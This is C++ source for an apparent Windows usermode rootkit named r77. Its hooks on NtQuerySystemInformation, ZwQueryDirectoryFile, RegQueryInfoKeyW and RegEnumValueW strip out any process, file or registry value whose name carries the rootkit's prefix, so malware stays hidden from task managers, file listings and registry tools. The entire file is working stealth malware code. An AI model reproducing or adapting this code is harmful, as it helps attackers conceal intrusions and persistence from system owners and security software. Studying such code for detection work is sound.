#include "r77.h"

Rootkit::NtQuerySystemInformation Rootkit::OriginalNtQuerySystemInformation;
Rootkit::ZwQueryDirectoryFile Rootkit::OriginalZwQueryDirectoryFile;
Rootkit::RegQueryInfoKeyW Rootkit::OriginalRegQueryInfoKeyW;
Rootkit::RegEnumValueW Rootkit::OriginalRegEnumValueW;

void Rootkit::Initialize()
{
	MH_Initialize();
	MH_CreateHookApi(L"ntdll.dll", "NtQuerySystemInformation", HookedNtQuerySystemInformation, (PVOID*)&OriginalNtQuerySystemInformation);
	if (sizeof(size_t) == 8) //TODO: Currently unstable on x86 processes!
	{
		MH_CreateHookApi(L"ntdll.dll", "ZwQueryDirectoryFile", HookedZwQueryDirectoryFile, (PVOID*)&OriginalZwQueryDirectoryFile);
	}
	MH_CreateHookApi(L"advapi32.dll", "RegQueryInfoKeyW", HookedRegQueryInfoKeyW, (PVOID*)&OriginalRegQueryInfoKeyW);
	MH_CreateHookApi(L"advapi32.dll", "RegEnumValueW", HookedRegEnumValueW, (PVOID*)&OriginalRegEnumValueW);
	MH_EnableHook(MH_ALL_HOOKS);
}
void Rootkit::DebugLog(wstring str)
{
	wofstream file;
	file.open("C:\\r77_debug.txt", std::wofstream::out | std::wofstream::app);
	if (file) file << str << endl;
	file.close();
}

NTSTATUS WINAPI Rootkit::HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS systemInformationClass, SystemProcessInformationEx *systemInformation, ULONG systemInformationLength, PULONG returnLength)
{
	NTSTATUS status = OriginalNtQuerySystemInformation(systemInformationClass, systemInformation, systemInformationLength, returnLength);

	if (NT_SUCCESS(status) && systemInformationClass == SYSTEM_INFORMATION_CLASS::SystemProcessInformation)
	{
		SystemProcessInformationEx *pCurrent;
		SystemProcessInformationEx *pNext = systemInformation;

		do
		{
			pCurrent = pNext;
			pNext = (SystemProcessInformationEx*)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

			if (!_wcsnicmp(pNext->ImageName.Buffer, ROOTKIT_PREFIX, min(pNext->ImageName.Length, 3)))
			{
				if (pNext->NextEntryOffset == 0) pCurrent->NextEntryOffset = 0;
				else pCurrent->NextEntryOffset += pNext->NextEntryOffset;
				pNext = pCurrent;
			}
		}
		while (pCurrent->NextEntryOffset);
	}

	return status;
}
NTSTATUS Rootkit::HookedZwQueryDirectoryFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, PVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, PVOID fileInformation, ULONG length, FileInformationClassEx fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan)
{
	NTSTATUS status = OriginalZwQueryDirectoryFile(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);

	if (NT_SUCCESS(status) && (fileInformationClass == FileInformationClassEx::FileDirectoryInformation || fileInformationClass == FileInformationClassEx::FileFullDirectoryInformation || fileInformationClass == FileInformationClassEx::FileIdFullDirectoryInformation || fileInformationClass == FileInformationClassEx::FileBothDirectoryInformation || fileInformationClass == FileInformationClassEx::FileIdBothDirectoryInformation || fileInformationClass == FileInformationClassEx::FileNamesInformation))
	{
		PVOID pCurrent = fileInformation;
		PVOID pPrevious = NULL;

		do
		{
			if (wstring(GetFileDirEntryFileName(pCurrent, fileInformationClass)).find(ROOTKIT_PREFIX) == 0)
			{
				if (GetFileNextEntryOffset(pCurrent, fileInformationClass) != 0)
				{
					int delta = (ULONG)pCurrent - (ULONG)fileInformation;
					int bytes = (DWORD)length - delta - GetFileNextEntryOffset(pCurrent, fileInformationClass);
					RtlCopyMemory((PVOID)pCurrent, (PVOID)((char*)pCurrent + GetFileNextEntryOffset(pCurrent, fileInformationClass)), (DWORD)bytes);
					continue;
				}
				else
				{
					if (pCurrent == fileInformation)status = 0;
					else SetFileNextEntryOffset(pPrevious, fileInformationClass, 0);
					break;
				}
			}

			pPrevious = pCurrent;
			pCurrent = (BYTE*)pCurrent + GetFileNextEntryOffset(pCurrent, fileInformationClass);
		}
		while (GetFileNextEntryOffset(pPrevious, fileInformationClass) != 0);
	}

	return status;
}
NTSTATUS Rootkit::HookedRegQueryInfoKeyW(HKEY hKey, PWSTR pClass, PDWORD pcClass, PDWORD pReserved, PDWORD pcSubKeys, PDWORD pcMaxSubKeyLen, PDWORD pcMaxClassLen, PDWORD pcValues, PDWORD pcMaxValueNameLen, PDWORD pcMaxValueLen, PULONG pulSecDescLen, PFILETIME pftLastWriteTime)
{
	NTSTATUS status = OriginalRegQueryInfoKeyW(hKey, pClass, pcClass, pReserved, pcSubKeys, pcMaxSubKeyLen, pcMaxClassLen, pcValues, pcMaxValueNameLen, pcMaxValueLen, pulSecDescLen, pftLastWriteTime);;

	if (status == ERROR_SUCCESS && pcValues != NULL && *pcValues > 0)
	{
		DWORD valueCount = *pcValues;
		WCHAR name[16383];

		for (DWORD i = 0; i < *pcValues; i++)
		{
			DWORD nameSize = 16383;
			name[0] = L'\0';
			if (OriginalRegEnumValueW(hKey, i, name, &nameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS &&
				RegQueryValueExW(hKey, name, 0, NULL, NULL, NULL) == ERROR_SUCCESS &&
				wstring(name).find(ROOTKIT_PREFIX) == 0)
			{
				valueCount--;
			}
		}

		*pcValues = valueCount;
	}

	return status;
}
NTSTATUS Rootkit::HookedRegEnumValueW(HKEY hKey, DWORD dwIndex, PWSTR pValueName, PDWORD pcchValueName, PDWORD pReserved, PDWORD pType, PBYTE pData, PDWORD pcbData)
{
	DWORD subKeyCount;
	DWORD valueCount;
	DWORD maxValueDataSize;

	if (RegistryQueryInfoKey(hKey, subKeyCount, valueCount, maxValueDataSize) && valueCount > 0)
	{
		WCHAR name[16383];

		for (DWORD i = 0; i < min(valueCount, dwIndex + 1); i++)
		{
			DWORD nameSize = 16383;
			name[0] = L'\0';
			if (OriginalRegEnumValueW(hKey, i, name, &nameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS &&
				RegQueryValueExW(hKey, name, 0, NULL, NULL, NULL) == ERROR_SUCCESS &&
				wstring(name).find(ROOTKIT_PREFIX) == 0)
			{
				dwIndex++;
			}
		}
	}

	return OriginalRegEnumValueW(hKey, dwIndex, pValueName, pcchValueName, pReserved, pType, pData, pcbData);
}
WCHAR* Rootkit::GetFileDirEntryFileName(PVOID fileInformation, FileInformationClassEx fileInformationClass)
{
	switch (fileInformationClass)
	{
	case FileInformationClassEx::FileDirectoryInformation:
		return ((FileDirectoryInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileFullDirectoryInformation:
		return ((FileFullDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileIdFullDirectoryInformation:
		return ((FileIdFullDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileBothDirectoryInformation:
		return ((FileBothDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileIdBothDirectoryInformation:
		return ((FileIdBothDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileNamesInformation:
		return ((FileNamesInformationEx*)fileInformation)->FileName;
	default:
		return NULL;
	}
}
ULONG Rootkit::GetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass)
{
	switch (fileInformationClass)
	{
	case FileInformationClassEx::FileDirectoryInformation:
		return ((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileFullDirectoryInformation:
		return ((FileFullDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileIdFullDirectoryInformation:
		return ((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileBothDirectoryInformation:
		return ((FileBothDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileIdBothDirectoryInformation:
		return ((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileNamesInformation:
		return ((FileNamesInformationEx*)fileInformation)->NextEntryOffset;
	default:
		return 0;
	}
}
void Rootkit::SetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass, ULONG value)
{
	switch (fileInformationClass)
	{
	case FileInformationClassEx::FileDirectoryInformation:
		((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileFullDirectoryInformation:
		((FileFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileIdFullDirectoryInformation:
		((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileBothDirectoryInformation:
		((FileBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileIdBothDirectoryInformation:
		((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileNamesInformation:
		((FileNamesInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	}
}
bool Rootkit::RegistryQueryInfoKey(HKEY hKey, DWORD &subKeyCount, DWORD &valueCount, DWORD &maxValueDataSize)
{
	WCHAR achClass[MAX_PATH] = L"";
	DWORD classNameSize = MAX_PATH;
	DWORD maxSubKeySize;
	DWORD maxClassSize;
	DWORD maxValueSize;
	DWORD securityDescriptor;
	FILETIME lastWriteTime;

	return OriginalRegQueryInfoKeyW(hKey, achClass, &classNameSize, NULL, &subKeyCount, &maxSubKeySize, &maxClassSize, &valueCount, &maxValueSize, &maxValueDataSize, &securityDescriptor, &lastWriteTime) == ERROR_SUCCESS;
}